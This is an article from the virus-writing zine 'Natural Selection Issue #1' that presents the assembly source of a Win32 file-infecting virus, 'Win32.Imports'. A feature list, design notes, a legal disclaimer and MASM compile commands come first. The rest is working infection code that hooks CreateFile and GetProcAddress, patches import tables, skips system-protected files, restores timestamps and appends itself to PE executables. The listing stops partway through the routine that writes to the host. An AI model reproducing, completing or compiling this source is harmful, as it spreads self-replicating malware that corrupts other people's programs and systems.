 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 ----------------------------- Win32.Imports )=-
 -=( ---------------------------------------------------------------------- )=-

 -=( 0 : Win32.Imports Features ------------------------------------------- )=-

 Imports:       Locates  LoadLibraryA and  GetProcAddress, if  they don't exist
                then it will find two strings   long enough,  then copies  them
                to   the virus and overwrites  the entries in the Import  Table
                with our own.
 Infects:       PE files with any extension, without setting write bit
 Strategy:      Per-Process    residency,   it    will    infect    any   files
                opened      using   CreateFileA/CreateFileW   by   the    host.
                We've  also hooked GetProcAddress to hide ourself.
 Compatibility: 95/98/ME/NT/2000 Compatible, avoids Win2K SFC'd files
 Saves Stamps:  Yes
 MultiThreaded: No
 Polymorphism:  None
 AntiAV / EPO:  None
 SEH Abilities: None
 Payload:       None

 -=( 1 : Win32.Imports Design Goals --------------------------------------- )=-

 : To test an implementation of MASMs type checking on API and PROC calls.
 : To  place all  virus data  into one  structure that  can be  moved around in
   memory so that the virus is outside of the hosts normal memory area.
 : To be per process and hook file API to locate infectable files.
 : To  overwrite strings  in the  Import Table  to import  needed API  and then
   overwrite  with the  original API   values.  Doesn't  need files  to  import
   a GetProcAddress /  LoadLibraryA to infect  them properly.  But  still, does
   not do manual Kernel32.DLL scanning.

 It took  2 -  3 weeks  of coding  time, and  2/3 of  that was in rewriting the
 Import Table code over and  over again to make it  work.  By the time that  it
 all worked, it was easy to pick a name, Win32.Imports.

 -=( 2 : Win32.Imports Design Faults -------------------------------------- )=-

 Its structure is  horrible.  When it  was finished, I  realised you could  use
 VirtualProtect API  to make  section data  writeable, and  so all  of the code
 based around moving the virus in memory is a waste of time.

 It does, however,  infect PE Headers  perfectly in all  PE files, and  doesn't
 even need to check for .EXE extensions, so it should infect .CPL and other  PE
 files as well.

 Rather than spend  time rewriting it  to be more  streamlined, it's better  to
 design a new virus from the ground up that does what you want.

 -=( 3 : Win32.Imports Disclaimer ----------------------------------------- )=-

 THE CONTENTS OF  THIS ELECTRONIC MAGAZINE  AND ITS ASSOCIATED  SOURCE CODE ARE
 COVERED UNDER THE BELOW TERMS AND CONDITIONS.  IF YOU DO NOT AGREE TO BE BOUND
 BY THESE TERMS AND CONDITIONS, OR  ARE NOT LEGALLY ENTITLED TO AGREE  TO THEM,
 YOU MUST DISCONTINUE USE OF THIS MAGAZINE IMMEDIATELY.

 COPYRIGHT
 Copyright on  materials in  this  magazine  and  the  information  therein and
 their  arrangement is owned by FEATHERED SERPENTS  unless otherwise indicated.

 RIGHTS AND LIMITATIONS
 You have  the  right  to use,    copy and  distribute  the  material in   this
 magazine free   of  charge,  for  all   purposes  allowed  by your   governing
 laws.  You    are expressly  PROHIBITED   from   using the  material contained
 herein  for   any   purposes  that   would   cause    or would    help promote
 the illegal   use of the material.

 NO WARRANTY
 The  information   contained within   this  magazine  are  provided  "as  is".
 FEATHERED    SERPENTS     do    not    warranty    the     accuracy, adequacy,
 or   completeness     of     given  information,  and    expressly   disclaims
 liability   for   errors   or   omissions    contained  therein.   No implied,
 express, or statutory  warranty, is given  in conjunction with  this magazine.

 LIMITATION OF LIABILITY
 In *NO* event will FEATHERED SERPENTS or any of its MEMBERS be liable for  any
 damages  including  and  without  limitation,  direct  or  indirect,  special,
 incidental,  or  consequential  damages,   losses,  or  expenses  arising   in
 connection with this magazine, or the use thereof.

 ADDITIONAL DISCLAIMER
 Computer viruses will spread of their own accord between computer systems, and
 across international boundaries.  They are raw animals with no concern for the
 law, and for that reason your possession of them makes YOU responsible for the
 actions they carry out.

 The viruses provided in this magazine are for educational purposes ONLY.  They
 are NOT intended for use in  ANY WAY outside of strict, controlled  laboratory
 conditions.  If compiled and executed these viruses WILL land you in court(s).

 You will be held responsible for your actions.  As  source code these  viruses
 are  inert  and   covered   by   implied  freedom   of  speech   laws  in some
 countries.  In  binary form  these viruses  are malicious  weapons.  FEATHERED
 SERPENTS do not condone the application of these viruses and will NOT be  held
 LIABLE for any MISUSE.

 -=( 4 : Win32.Imports Compile Instructions ------------------------------- )=-

 MASM 6.15 and LINK 6.00.8447

 ml /c /Cp /coff /Fl /Zi Imports.asm
 link /debug /debugtype:cv /subsystem:windows Imports.obj

 -=( 5 : Win32.Imports ---------------------------------------------------- ) `

.386p                                   ; 386 opcodes
.model     flat,stdcall                 ; Written for flat Win32
option     casemap:none                 ; Use mixed case symbols
include    masmwinc.inc                 ; Win32 constant symbols
includelib c:\masm32\lib\kernel32.lib   ; First-run imported API

CreateFileW             PROTO   :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
CloseHandle             PROTO   :DWORD
ExitProcess             PROTO   :DWORD
LoadLibraryA            PROTO   :DWORD
GetProcAddress          PROTO   :DWORD, :DWORD
VirtualAlloc            PROTO   :DWORD, :DWORD, :DWORD, :DWORD

; We'll drop ourselves into a file that can do CreateFileA/CreateFileW easily
Host        SEGMENT 'CODE'
HostFile    DW 'C', 'M', 'D', '.', 'E', 'X', 'E', 0

Exitpoint   PROC
    INVOKE  CreateFileW, ADDR HostFile, GENERIC_READ OR GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
    .IF     (eax != INVALID_HANDLE_VALUE)
            INVOKE  CloseHandle, eax
    .ENDIF
    INVOKE  ExitProcess, NULL

    ; These are not called, only imported for the virus, and yes they like to
    ; crash when given bad values ;)
    call    LoadLibraryA
    call    GetProcAddress
    call    VirtualAlloc
Exitpoint   ENDP
Host        ENDS

; =============================================================================
; ( Procedure Layout ) ========================================================
; =============================================================================
; Also, INVOKE needs PROTOs to reference PROCs that are at the end of the file.
    Exitpoint                   PROTO
    Entrypoint                  PROTO

    LoadsFile                   PROTO   :PTR VX,:DWORD
    CheckFile                   PROTO   :PTR VX,:DWORD
    WriteFile                   PROTO   :PTR VX,:DWORD

    SetupImports                PROTO   :PTR VX,:DWORD, :DWORD
    ConvertAlign                PROTO   :DWORD, :DWORD
    ConvertToRaw                PROTO   :DWORD, :DWORD

    AlternateSfcIsFileProtected PROTO   :DWORD, :DWORD
    AlternateCheckSumMappedFile PROTO   :DWORD, :DWORD, :DWORD, :DWORD
    HookGetProcAddress          PROTO   :DWORD, :DWORD
    HookCreateFileW             PROTO   :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
    HookCreateFileA             PROTO   :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

; =============================================================================
; ( Constants ) ===============================================================
; =============================================================================
; We avoid files with bad attributes.  Buffer_Size is for storing strings we've
; overwritten in the Import Table, Hooks Count is how many API we have in our
; Hooking Table.  P_'s are RVA Pointers to locations inside our 1st Gen Host.
    AVOIDED_FILES   EQU FILE_ATTRIBUTE_DEVICE           OR  FILE_ATTRIBUTE_SPARSE_FILE  OR \
                        FILE_ATTRIBUTE_REPARSE_POINT    OR  FILE_ATTRIBUTE_OFFLINE      OR \
                        FILE_ATTRIBUTE_COMPRESSED       OR  FILE_ATTRIBUTE_ENCRYPTED

    BUFFER_SIZE     EQU 20H
    HOOKS_COUNT     EQU 3

    P_HOSTS             EQU 3000H + (Exitpoint - HostFile)
    P_VIRUS             EQU 5000H

    P_LOADLIBRARYA      EQU 8078H
    P_GETPROCADDRESS    EQU 807CH
    P_CREATEFILEW       EQU 8084H

; ============================================================================
; ( Virus Macros ) ===========================================================
; ============================================================================
; DESCRIBE splits long API strings from me into useable units of information :P
; tAPI          TypeDef for this API for Parameter Checking
; mAPI          Preconstructed MACRO for API, limited only to a few built ones
; bAPI          [OPTIONAL] Buffer for stolen API Strings
; lAPI          [OPTIONAL] Length of sAPI, ONLY useable on GetProc/LoadLibraryA
; pAPI          Final API VA, or API RVA for GetProc/LoadLibraryA at Entrypoint
; sAPI          API String
; DO_API is a wrapper for INVOKE that stops registers except EAX from changing.
; LOCATE is a small clean way to get Delta Offset into EDX

    DESCRIBE    MACRO   NAME:REQ, COUNT:REQ, VALUE:=<0>, PARAMETERS, STACK, FINISH
                LOCAL   T_LIST, S_SIZE

                T_LIST  TEXTEQU             <TYPEDEF PROTO>
                REPEAT  (COUNT - 1)
                        T_LIST   CATSTR T_LIST, < :DWORD, >
                ENDM
                        t&NAME   &T_LIST :DWORD

                m&NAME  MACRO       PARAMETERS
                        DO_API      t&NAME PTR [edx][VX.p&NAME], STACK
                        &FINISH
                ENDM

                S_SIZE  SIZESTR <&NAME>
                IF      &VALUE
                b&NAME  DB '&NAME'
                        DB (BUFFER_SIZE - S_SIZE) DUP (0)
                l&NAME  DD S_SIZE + 2
                ENDIF
                p&NAME  DD &VALUE
                s&NAME  DB '&NAME',  0
                        ALIGN   2
    ENDM

    DO_API              MACRO   PARAMETERS:VARARG
                        PUSHAD
                        INVOKE  &PARAMETERS
                        MOV     [ESP+1CH], EAX
                        POPAD
    ENDM

    LOCATE      MACRO
                        CALL @F
                    @@: POP EDX
                        SUB EDX, (($ - 1) - Virus_Data)
    ENDM

; ============================================================================
; ( Main Data Structure ) ====================================================
; ============================================================================
; VX is used for all of the main data, and LVX a small version just for loadup.

VX          STRUCT      DWORD
    ; RVA of VX Structure inside Host, and RVA of Host's Original Entrypoint
    SectionEntrypoint   DD P_VIRUS
    HostEntrypoint      DD P_HOSTS

    FileAttributes      DD 0
    FileCreationTime    FILETIME {}
    FileLastAccessTime  FILETIME {}
    FileLastWriteTime   FILETIME {}
    FileSize            DD 0

    ; RVA of Kernel32.DLL Import Table so we can clear Binding in WriteFile.
    BoundImport         DD 0

    ; RVA of the Section we will end up in, and its Size.  ThunkArrayRVA is
    ; used in SetupImports to track the FirstThunk entry of API in a loop.
    LastSection         DD 0
    SizeSection         DD 0
    ThunkArrayRVA       DD 0

    ; Our base API Data Table.  Imagine if I didn't have MACRO and had to split
    ; this across more than one line each!
    ;                   Name,                   Count,  Value,              Macro Setup,        Macro Parameters,                                                   Macro Finish
    DESCRIBE            CheckSumMappedFile,     4
    DESCRIBE            CloseHandle,            1
    DESCRIBE            CompareStringA,         6,      ,                   <STRING1, STRING2>, <LOCALE_SYSTEM_DEFAULT, NORM_IGNORECASE, STRING1, -1, STRING2, -1>, <cmp    eax, 2>
    DESCRIBE            CreateFileA,            7,      ,                   <NAME>,             <NAME, GENERIC_READ OR GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0  >
    DESCRIBE            CreateFileW,            7
    DESCRIBE            CreateFileMappingA,     6,      ,                   <HANDLE, FILESIZE>, <HANDLE, 0, PAGE_READWRITE, 0, FILESIZE, 0>
    DESCRIBE            ExitProcess,            1
    DESCRIBE            GetFileSize,            2
    DESCRIBE            GetFileTime,            4
    DESCRIBE            GetFileType,            1
    DESCRIBE            GetFileAttributesA,     1
    DESCRIBE            GetProcAddress,         2,      P_GETPROCADDRESS
    DESCRIBE            LoadLibraryA,           1,      P_LOADLIBRARYA
    DESCRIBE            MapViewOfFile,          5,      ,                   <HANDLE>,           <HANDLE, FILE_MAP_ALL_ACCESS, NULL, NULL, NULL>
    DESCRIBE            SetFileAttributesA,     2
    DESCRIBE            SetFileTime,            4
    DESCRIBE            SfcIsFileProtected,     2
    DESCRIBE            UnmapViewOfFile,        1
    DESCRIBE            WideCharToMultiByte,    8
    DESCRIBE            VirtualAlloc,           4
    DESCRIBE            VirtualProtect,         4

    UsedKernel          DB 'KERNEL32.DLL',          0
    UsedImage           DB 'IMAGEHLP.DLL',          0
    UsedSFC             DB 'SFC.DLL',               0
    ; Our Table of API we need to import.  ExitProcess and VirtualAlloc are now
    ; excluded, as they're not used past Entrypoint which uses them directly.
    ;                   Pointer to our Pointer,     Pointer to DLL,         Pointer to Alternate Routine
    UsedAPI             DD VX.pCheckSumMappedFile,  VX.UsedImage,           AlternateCheckSumMappedFile - Virus_Data
                        DD VX.pCloseHandle,         VX.UsedKernel,          NULL
                        DD VX.pCompareStringA,      VX.UsedKernel,          NULL
                        DD VX.pCreateFileA,         VX.UsedKernel,          NULL
                        DD VX.pCreateFileW,         VX.UsedKernel,          NULL
                        DD VX.pCreateFileMappingA,  VX.UsedKernel,          NULL
                        ;D VX.pExitProcess,         VX.UsedKernel,          NULL
                        DD VX.pGetFileAttributesA,  VX.UsedKernel,          NULL
                        DD VX.pGetFileSize,         VX.UsedKernel,          NULL
                        DD VX.pGetFileTime,         VX.UsedKernel,          NULL
                        DD VX.pGetFileType,         VX.UsedKernel,          NULL
                        DD VX.pGetProcAddress,      VX.UsedKernel,          NULL
                        DD VX.pLoadLibraryA,        VX.UsedKernel,          NULL
                        DD VX.pMapViewOfFile,       VX.UsedKernel,          NULL
                        DD VX.pSetFileAttributesA,  VX.UsedKernel,          NULL
                        DD VX.pSetFileTime,         VX.UsedKernel,          NULL
                        DD VX.pSfcIsFileProtected,  VX.UsedSFC,             AlternateSfcIsFileProtected - Virus_Data
                        DD VX.pUnmapViewOfFile,     VX.UsedKernel,          NULL
                        ;D VX.pVirtualAlloc,        VX.UsedKernel,          NULL
                        ;D VX.pVirtualProtect,      VX.UsedKernel,          NULL
                        DD VX.pWideCharToMultiByte, VX.UsedKernel,          NULL
                        DD NULL

    ; Our Table of API we want to hook, and corresponding routines in our code.
    ;                   RVA into Import Table,      Replacement Address,                Pointer to our Pointer
    HookAPI             DD NULL,                    HookCreateFileA     -   Virus_Data, VX.pCreateFileA
                        DD P_CREATEFILEW,           HookCreateFileW     -   Virus_Data, VX.pCreateFileW
                        DD P_GETPROCADDRESS,        HookGetProcAddress  -   Virus_Data, VX.pGetProcAddress

    ; Not really necessary, but don't want to take it out and forget later why
    ; everything crashes if I ever wanted to push a structure onto a stack :P
                        DB 0, 'Win32.Imports', 0
    ALIGN               4
VX          ENDS

LVX         STRUCT      DWORD
    ImageBase           DD 0
    KernelHandle        DD 0
    pExitProcess        DD 0
    pLoadLibraryA       DD 0
    pGetProcAddress     DD 0
    pVirtualProtect     DD 0
    ProtectedArea       DD 0
    OldProtection       DD 0
LVX         ENDS

; =============================================================================
; ( Entrypoint and Setup ) ====================================================
; =============================================================================
Virus       SEGMENT 'CODE'
Virus_Data  VX {}

WinMain:
    ; Save a NULL on the stack which we will turn into a VA and RET to later
    push    NULL

Entrypoint  PROC
            LOCAL   VD:LVX

    ; Save the registers, so programs don't crash!  Calculate our ImageBase.
    ; EDX = Start Virus,                                  EAX = Start Image.
    pushad
    pushfd
    LOCATE
    mov     eax, edx
    sub     eax, [edx][VX.SectionEntrypoint]

    ; Save VAs of GetProcAddress/LoadLibraryA Pointers, then steal the VA of
    ; the API themselves.
    ; ESI = GetProcAddress API,                       EDI = LoadLibraryA API
    mov     esi, [edx][VX.pGetProcAddress]
    lea     ebx, [eax][esi               ]
    push    ebx
    mov     esi, [ebx                    ]

    mov     edi, [edx][VX.pLoadLibraryA  ]
    lea     ebx, [eax][edi               ]
    push    ebx
    mov     edi, [ebx                    ]

    ; Save values into our stack structure, and overwrite the NULL we stored
    ; on the stack at Entrypoint, with the the return VA of the Host.
    mov     [VD.pGetProcAddress],     esi
    mov     [VD.pLoadLibraryA],       edi
    mov     [VD.ImageBase],           eax
    add     eax, [edx][VX.HostEntrypoint]
    mov     [ebp][4],                 eax

    ; Save handle of Kernel32.DLL, plus ExitProcess and VirtualProtect VA's.
    DO_API  tLoadLibraryA   PTR edi, ADDR [edx][VX.UsedKernel]
    mov     [VD.KernelHandle], eax
    DO_API  tGetProcAddress PTR esi, [VD.KernelHandle], ADDR [edx][VX.sExitProcess]
    mov     [VD.pExitProcess], eax
    DO_API  tGetProcAddress PTR esi, [VD.KernelHandle], ADDR [edx][VX.sVirtualProtect]
    mov     [VD.pVirtualProtect], eax

    ; Make the Import Table writeable, then calculate stolen API and fix up.
    pop     edi
    mov     [VD.ProtectedArea], edi
    DO_API  tVirtualProtect PTR [VD.pVirtualProtect], edi, 4, PAGE_EXECUTE_READWRITE, ADDR [VD.OldProtection]

    DO_API  tGetProcAddress PTR esi, [VD.KernelHandle], ADDR [edx][VX.bLoadLibraryA]
    test    eax, eax
    jz      WinFail
    stosd

    pop     edi
    DO_API  tGetProcAddress PTR esi, [VD.KernelHandle], ADDR [edx][VX.bGetProcAddress]
    test    eax, eax
    jz      WinFail
    stosd

    ; Move the virus into memory, and return to the Host if none is available.
    mov     ecx, Virus_Size
    DO_API  tGetProcAddress PTR esi, [VD.KernelHandle], ADDR [edx][VX.sVirtualAlloc]
    DO_API  tVirtualAlloc   PTR eax, NULL, ecx, MEM_COMMIT OR MEM_RESERVE, PAGE_EXECUTE_READWRITE
    .IF     (eax == NULL)
            jmp     WinExit
    .ELSE
            lea     esi, [edx]
            lea     edi, [eax]
            shr     ecx, 2
            cld
            rep     movsd
            lea     edx, [eax]
    .ENDIF

    ; Now that we can start writing to our data section, it's time to parse
    ; our UsedAPI list.  RVAs are relative to VX.
    ; Format:   RVA of our storage and ASCIIZ       -- Or NULL [End of Table]
    ;           RVA to DLL Name for this Import
    ;           RVA of Alternate Internal API
    lea     esi, [edx][VX.UsedAPI]
    .WHILE  TRUE
            ; Abort if this entry marks the end of the table.  Otherwise get it
            ; ready to write the final API address to.  Load the next value as
            ; it's the RVA of the DLL Name.
            lodsd
            .BREAK  .IF (eax == NULL)
            lea     edi, [edx][eax]
            lea     ebx, [edx][eax][4]
            lodsd

            ; Get the API's address
            DO_API  tLoadLibraryA   PTR [VD.pLoadLibraryA], ADDR [edx][eax]
            DO_API  tGetProcAddress PTR [VD.pGetProcAddress],    eax,   ebx

            ; Overwrite our Internal Entry with the API and load the Alternate
            ; API RVA just in case.  If the API wasn't found and there is no
            ; Alternate Entry, then we abort immediately.  Otherwise convert
            ; it to a VA and save it as the Internal Entry instead.
            stosd
            or      eax, eax
            lodsd
            .IF     (ZERO?)
                    .IF     (eax == NULL)
                            jmp WinFail
                    .ENDIF
                    lea     eax, [edx][eax]
                    mov     [edi][-4],  eax
            .ENDIF
    .ENDW

    ; Our last stage of setup is to hook all of the hookable API that the
    ; host uses
    ; Format:       RVA of Import Address to Overwrite
    ;               RVA relative to VX of our Hook API
    ;               RVA of VX.pName
    lea     esi, [edx][VX.HookAPI]
    mov     ecx, HOOKS_COUNT
    .REPEAT
            ; First entry is RVA of Import Address Table Entry.  Second entry
            ; is the RVA of our Hook Procedure.  Third entry is only used in
            ; setting up the HookAPI.
            lodsd
            .IF     (eax == NULL)
                    lodsd
            .ELSE
                    add     eax, [VD.ImageBase]
                    mov     edi, eax
                    lodsd
                    lea     eax, [edx][eax]
                    stosd
            .ENDIF
            lodsd
    .UNTILCXZ

WinExit:
    ; Restore section attributes.
    mov     edi, [VD.ProtectedArea]
    DO_API  tVirtualProtect PTR [VD.pVirtualProtect], edi, 4, [VD.OldProtection], ADDR [VD.OldProtection]

    ; Everything is AOK, we'll leave the virus and return to the Host, but
    ; we've already hooked it's API and will be called into action soon :)
    popfd
    popad
    ret

WinFail:
    ; Something went terribly wrong and the Host is probably a trap, so we
    ; exit as quickly as possible and don't let it execute.
    INVOKE  tExitProcess PTR [VD.pExitProcess], -1
Entrypoint  ENDP

; =============================================================================
; ( Control Center ) ==========================================================
; =============================================================================
LoadsFile   PROC    VD:PTR VX,  FILENAME:DWORD
    ; Make sure the files are not protected under Win2K File Protection :|
    mov     edx, [VD]
    mov     esi, [FILENAME]

    DO_API  tSfcIsFileProtected PTR [edx][VX.pSfcIsFileProtected], NULL, esi
    test    eax, eax
    jnz     LoadsExit

    ; Avoid files with certain attributes, and if they are read only or if
    ; they are system, zero these attributes temporarily.  We only change
    ; attributes if absolutely necessary, less logs, and heuristics, okay?
    DO_API  tGetFileAttributesA PTR [edx][VX.pGetFileAttributesA], esi
    cmp     eax, INVALID_HANDLE_VALUE
    je      LoadsExit
    mov     [edx][VX.FileAttributes], eax
    test    eax, AVOIDED_FILES
    jnz     LoadsExit
    test    eax, FILE_ATTRIBUTE_READONLY OR FILE_ATTRIBUTE_SYSTEM
    .IF     !(ZERO?)
            DO_API  tSetFileAttributesA PTR [edx][VX.pSetFileAttributesA], esi, FILE_ATTRIBUTE_NORMAL
            test    eax, eax
            jz      LoadsExit
    .ENDIF

    ; Open our file.  All opens are done in read-write mode as it saves me
    ; from having to mess around.  Save the time stamps straight away.
    mCreateFileA    esi
    cmp     eax,    INVALID_HANDLE_VALUE
    je      LoadsExitAttributes
    push    eax
    mov     ebx, eax

    DO_API  tGetFileTime PTR [edx][VX.pGetFileTime], ebx, ADDR [edx][VX.FileCreationTime], ADDR [edx][VX.FileLastAccessTime], ADDR [edx][VX.FileLastWriteTime]
    test    eax, eax
    jz      LoadsExitClose
    push    ebx

    ; Check the file size, don't Loads files that are too small or too big.
    ; Too small = Below 16K.  Too big = Above 1G.
    DO_API  tGetFileSize PTR [edx][VX.pGetFileSize], ebx, NULL
    cmp     eax, 000004000H
    jb      LoadsExitTimes
    cmp     eax, 040000000H
    ja      LoadsExitTimes
    mov     [edx][VX.FileSize], eax

    ; Make sure this is a disk file and not some other handle we've opened!!
    DO_API  tGetFileType PTR [edx][VX.pGetFileType], ebx
    cmp     eax, FILE_TYPE_DISK
    jne     LoadsExitTimes

    ; Turn the file handle into a mapping handle, and map a view into memory
    mCreateFileMappingA  ebx,  NULL
    test    eax, eax
    jz      LoadsExitTimes
    push    eax
    mMapViewOfFile  eax
    cmp     eax,    INVALID_HANDLE_VALUE
    je      LoadsExitMap
    push    eax

    ; Run checks on the file and fill in virus information fields so that we
    ; can infect it if we want.  We *DON'T* modify anything at this stage so
    ; if something goes wrong, the file is still in its original state.
    DO_API  CheckFile, edx, eax
    test    eax, eax
    jz      LoadsExitView

    ; Close our View and Map, then recreate the file bigger so the virus can
    ; fit inside.  We don't know how much extra space the virus will take,
    ; until after PrepareFile, where it's had a chance to look at FileAlign.
    pop     ebx
    DO_API  tUnmapViewOfFile PTR [edx][VX.pUnmapViewOfFile], ebx
    pop     ebx
    DO_API  tCloseHandle PTR [edx][VX.pCloseHandle], ebx

    ; Turn the file handle into a mapping handle, and map a view into memory
    pop     ebx
    push    ebx
    mCreateFileMappingA ebx, [edx][VX.FileSize]
    test    eax,   eax
    jz      LoadsExitTimes
    push    eax
    mMapViewOfFile eax
    cmp     eax,   INVALID_HANDLE_VALUE
    jz      LoadsExitMap
    push    eax

    ; With everything prepared, now we write ourselves to the our new host :)
    DO_API  WriteFile, edx, eax

LoadsExitView:         ; Close a View
    pop     ebx
    DO_API  tUnmapViewOfFile PTR [edx][VX.pUnmapViewOfFile], ebx
LoadsExitMap:          ; Close a Map
    pop     ebx
    DO_API  tCloseHandle PTR [edx][VX.pCloseHandle], ebx
LoadsExitTimes:        ; Restore Time Stamps
    pop     ebx
    DO_API  tSetFileTime PTR [edx][VX.pSetFileTime], ebx, ADDR [edx][VX.FileCreationTime], ADDR [edx][VX.FileLastAccessTime], ADDR [edx][VX.FileLastWriteTime]
LoadsExitClose:        ; Close a Handle
    pop     ebx
    DO_API  tCloseHandle PTR [edx][VX.pCloseHandle], ebx
LoadsExitAttributes:   ; Restore Attributes only if they've been changed
    test    [edx][VX.FileAttributes], FILE_ATTRIBUTE_READONLY OR FILE_ATTRIBUTE_SYSTEM
    jz      LoadsExit
    DO_API  tSetFileAttributesA PTR [edx][VX.pSetFileAttributesA], [FILENAME], [edx][VX.FileAttributes]
LoadsExit:             ; Finally, we can exit!
    ret
LoadsFile   ENDP

; =============================================================================
; ( Prepare File For Infection ) ==============================================
; =============================================================================
CheckFile   PROC    VD:PTR VX,  FILEHANDLE:DWORD
    ; We are mainly concerned with looping through the Imports and Sections
    ; gathering data, so first, we clear out our Import storage areas
    xor     eax, eax
    mov     edx, [VD        ]
    mov     [edx][VX.pLoadLibraryA  ], eax
    mov     [edx][VX.pGetProcAddress], eax
    lea     edi, [edx][VX.HookAPI   ]
    mov     ecx, HOOKS_COUNT
    .REPEAT
            stosd
            add     edi, 8
    .UNTILCXZ
    mov     edi, [FILEHANDLE]

    ; Check if the file is already infected [DOS Checksum = -1], and load up
    ; the PE Header, running it for basic Win32 Intel PE checks.
    cmp     [edi][IMAGE_DOS_HEADER.e_csum],                                -1
    je      CheckFail
    cmp     [edi][IMAGE_DOS_HEADER.e_magic],              IMAGE_DOS_SIGNATURE
    jne     CheckFail
    add     edi, [edi][IMAGE_DOS_HEADER.e_lfanew]
    cmp     [edi][PE.Signature],                           IMAGE_NT_SIGNATURE
    jne     CheckFail
    cmp     [edi][PE.Machine],                        IMAGE_FILE_MACHINE_I386
    jne     CheckFail
    test    [edi][PE.Characteristics],            IMAGE_FILE_EXECUTABLE_IMAGE
    jz      CheckFail
    test    [edi][PE.Characteristics],                         IMAGE_FILE_DLL
    jnz     CheckFail
    cmp     [edi][PE.SizeOfOptionalHeader], IMAGE_SIZEOF_NT_OPTIONAL32_HEADER
    jne     CheckFail
    cmp     [edi][PE.Magic],                    IMAGE_NT_OPTIONAL_HDR32_MAGIC
    jne     CheckFail
    cmp     [edi][PE.SizeOfHeaders],                                        0
    je      CheckFail
    cmp     [edi][PE.NumberOfRvaAndSizes],                                  2
    jb      CheckFail

    ; Begin a loop through our Import Table, searching for a Kernel32.DLL
    mov     eax, [edi][PE.DataDirectory.Import.RVA]
    mov     [edx][VX.BoundImport     ], eax
    DO_API  ConvertToRaw, [FILEHANDLE], eax
    test    eax, eax
    jz      CheckFail
    mov     esi, eax
    .WHILE  TRUE
            ; Abort if it's the end of the table, otherwise string compare
            DO_API  ConvertToRaw, [FILEHANDLE], [esi][IMPORT.Names]
            test    eax, eax
            jz      CheckFail
            mCompareStringA ADDR [edx][VX.UsedKernel], eax
            .BREAK  .IF   (ZERO?)
            add     [edx][VX.BoundImport], SIZE IMPORT
            add     esi, SIZE IMPORT
    .ENDW

    ; Set up all of our Import Information, and save the RVA of this Import
    DO_API  SetupImports, [VD], [FILEHANDLE], esi
    test    eax, eax
    jz      CheckFail

    ; Make sure that at least one Hook has been fulfilled, otherwise if we
    ; infect, it's a waste of time :|
    lea     esi, [edx][VX.HookAPI]
    mov     ecx, HOOKS_COUNT
    .REPEAT
            cmp     dword ptr [esi], 0
            jnz     @F
            add     esi, 12
    .UNTILCXZ
    jmp     CheckFail

@@: ; Scan through the section table until we locate the section with
    ; the highest RVA.  Then we make sure it has a physical location.
    movzx   ecx, [edi][PE.NumberOfSections     ]
    add      di, [edi][PE.SizeOfOptionalHeader ]
    adc     edi, PE.Magic
    xor     eax, eax
    .REPEAT
            cmp [edi][SECTION.VirtualAddress], eax
            .IF     !(CARRY?)
                    mov     eax, [edi][SECTION.VirtualAddress]
                    mov     esi, edi
            .ENDIF
            add     edi, SIZE SECTION
    .UNTILCXZ

    ; Save the RVA of the our Section for us to twiddle with in WriteFile.
    mov     edi, esi
    sub     esi, [FILEHANDLE]
    mov     [edx][VX.LastSection], esi
    mov     esi, [FILEHANDLE]
    add     esi, [esi][IMAGE_DOS_HEADER.e_lfanew   ]

    ; Sections are allocated memory up to PE.SectionAlignment, so we want
    ; to place the virus after that, and ALSO skip past any overlay data
    ; that's at the end of the PE and not in any sections.
    ; 1. How big is the Section's memory allocation?
    mov     eax, [edi][SECTION.VirtualSize]
    cmp     eax, [edi][SECTION.SizeOfRawData]
    ja      @F
    mov     eax, [edi][SECTION.SizeOfRawData]
@@: DO_API  ConvertAlign, [esi][PE.SectionAlignment], eax

    ; 2. How big is the file minus File Section, plus Memory Section?
    mov     ebx, eax
    DO_API  ConvertAlign, [esi][PE.FileAlignment], [edi][SECTION.SizeOfRawData]
    test    eax, eax
    jz      CheckFail
    add     eax, [edx][VX.FileSize]
    sub     eax, ebx

    ; 3. If the file is bigger than it would be, we have lots of overlay
    ;    data, so base our start-of-virus value to be AFTER that.
    cmp     eax, [edx][VX.FileSize]
    ja      @F
    mov     eax, [edx][VX.FileSize]
@@: sub     eax, [edi][SECTION.PointerToRawData]
    push    eax
    add     eax, [edi][SECTION.VirtualAddress  ]
    mov     [edx][VX.SectionEntrypoint],     eax
    pop     eax

    ; Now save the Section size [yes, we only need to FileAlign it], and
    ; of course the total size of the file.
    add     eax, Virus_Size
    DO_API  ConvertAlign, [esi][PE.FileAlignment], eax
    mov     [edx][VX.SizeSection],                 eax

    add     eax, [edi][SECTION.PointerToRawData]
    mov     [edx][VX.FileSize],              eax
    mov     eax,   -1
    jmp     CheckExit

CheckFail:
    xor     eax, eax
CheckExit:
    ret
CheckFile   ENDP

; =============================================================================
; ( Write Host ) ==============================================================
; =============================================================================
WriteFile   PROC    VD:PTR VX, FILEHANDLE:DWORD
    ; Set our infection marker  |  EDX = VD  |  EDI = PE  |  ESI = SECTION
    mov     edx, [VD]
    mov     edi, [FILEHANDLE]
    mov     [edi][IMAGE_DOS_HEADER.e_csum], -1

    mov     esi, [edx][VX.LastSection]
    lea     esi, [edi][esi]
    add     edi, [edi][IMAGE_DOS_HEADER.e_lfanew]
    push    edi

    ; Update SizeOfImage field, and then update with correct Section fields
    mov     eax, [esi][SECTION.VirtualSize      ]
    cmp     eax, [esi][SECTION.SizeOfRawData    ]
    ja      @F
    mov     eax, [esi][SECTION.SizeOfRawData    ]
@@: DO_API  ConvertAlign, [edi][PE.SectionAlignment], eax
    sub     [edi][PE.SizeOfImage], eax
    mov     ebx, [edx][VX.SizeSection]
    add     [edi][PE.SizeOfImage], ebx

    mov     [esi][SECTION.VirtualSize  ], ebx
    mov     [esi][SECTION.SizeOfRawData], ebx
    or      [esi][SECTION.Characteristics], IMAGE_SCN_MEM_READ
    and     [esi][SECTION.Characteristics], NOT IMAGE_SCN_MEM_DISCARDABLE

    ; Update SizeOfCode/SizeOfInitializedData/SizeOfUninitializedData field
    test    [esi][SECTION.Characteristics], IMAGE_SCN_CNT_CODE
    .IF     !(ZERO?)
            sub     [edi][PE.SizeOfCode], eax
            add     [edi][PE.SizeOfCode], ebx
    .ENDIF
